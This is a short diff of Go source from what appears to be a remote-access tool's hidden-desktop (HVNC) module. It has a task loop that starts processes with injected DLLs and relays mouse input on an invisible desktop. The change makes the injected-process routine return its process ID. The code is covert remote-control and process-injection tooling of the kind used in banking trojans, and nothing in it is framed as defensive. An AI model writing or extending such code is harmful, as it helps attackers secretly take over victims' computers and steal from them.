@@ -223,6 +223,7 @@ type hvncTask struct {
 type hvncTaskResult struct {
 	img *image.RGBA
 	err error
+	pid uint32
 }
 
 type startupInfo struct {
@@ -459,7 +460,7 @@ func ensureHVNCThread() error {
 				hvncThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
 				close(hvncThreadReady)
 				for task := range hvncThreadTasks {
-					task.resp <- hvncTaskResult{nil, hvncThreadErr}
+					task.resp <- hvncTaskResult{err: hvncThreadErr}
 				}
 				return
 			}
@@ -480,7 +481,7 @@ func ensureHVNCThread() error {
 				case hvncTaskStartProcess:
 					result.err = startHVNCProcessOnThread(task.filePath)
 				case hvncTaskStartProcessInjected:
-					result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
+					result.pid, result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
 				case hvncTaskMouseMove:
 					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
 				case hvncTaskMouseDown:
